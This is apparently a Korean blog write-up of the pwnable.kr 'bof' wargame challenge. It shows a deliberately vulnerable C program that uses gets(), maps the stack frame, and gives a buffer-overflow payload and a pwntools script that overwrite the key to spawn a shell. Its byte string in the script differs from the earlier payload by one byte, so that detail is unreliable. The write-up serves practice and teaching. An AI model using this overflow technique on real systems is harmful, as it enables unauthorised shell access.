---
layout: post
title: "bof"
categories: [System Hacking]
tags: [CTF, Wargame, Exploit]
last_modified_at: 2024-09-17
---

이름부터 bof이다 

코드 보자 
```cpp
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
void func(int key){
	char overflowme[32];
	printf("overflow me : ");
	gets(overflowme);	 // smash me!
	if(key == 0xcafebabe){
		system("/bin/sh");
	}
	else{
		printf("Nah..\n");
	}
}
int main(int argc, char* argv[]){
	func(0xdeadbeef);
	return 0;
}
```
key값이 0xdeadbeef로 들어갔는데 bof로 이부분을 0xcafebabe로 바꿔주면 /bin/sh가 실행되어 끝나는 문제이다

(한 문장이 되게 길다) 

스택 프레임부터 파악해보도록 하자 

![Stack Frame](https://blog.kakaocdn.net/dna/bpf6nw/btsJE0nKXlW/AAAAAAAAAAAAAAAAAAAAANcsw3J9fqmK4-sCWCKgnn265P5jhse61TgkrxL5RusN/img.png?credential=yqXZFxpELC7KVnFOS48ylbz2pIh7yKj8&expires=1769871599&allow_ip=&allow_referer=&signature=Lij9H9u4dx9u7GNs4RqKPtbFFfg%3D)

cmp로 ebp+0x8과 0xcafebabe를 비교하고 있다 -> ebp+0x8이 key 위치 

gets 전 인자 호출을 보면 lea eax, [ebp-0x2c] 이므로 ebp-0x2c가 overflowme 위치 

정리하면.. 

ebp-0x48 (sub esp, 0x48을 빼줌)  
ㄴ 거기서 ebp-0xc도 있고 -> 12 bytes  
ㄴ 거기서 0x2c도 있음 -> 이건 overflowme -> 32 bytes, 0x2c인 이유는 12+32이니까  
ㄴ 나머진 몰?루  
ebp(sfp) -> 86이니까 4bytes  
ret(함수호출규약에 의해 stack에 꼭 존재) -> 86이니까 4bytes  
ebp+0x8 -> key  

설명이 더러우니까 표로 깔끔하게 정리하면...

| 스택은 아래서 위로 |  |  |
|------------------|------------------|------------------|
| sub esp, 0x48    | ebp-0x48         | 더미             |
|                  | ebp-0x2c         | overflowme<br/>32 bytes |
|                  | ebp-0xc          | 더미<br/>12 bytes |
|                  | ebp(sfp)         | 4 bytes          |
|                  | ret (func)       | 4 bytes          |
|                  | ebp+0x8 (인자니까 ret전에) | key<br/>8 bytes 리틀엔디언 지켜서 \xbe\xba\xfe\xca |

4+4+12+32 52 bytes로 채우고 \xbe\xba\xfe\xca 

```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xbe\xba\xfe\xca
```

pwntools와 친숙해져야 하니까 간단하게 작성해보자..
```python
from pwn import *

p=remote('pwnable.kr',9000)

payload=b'A'*52+b'\xbe\xba\xfd\xca'
p.sendline(payload)
p.interactive()
```

뭐지 왜 안되지 했는데 flag가 그냥 daddy~였다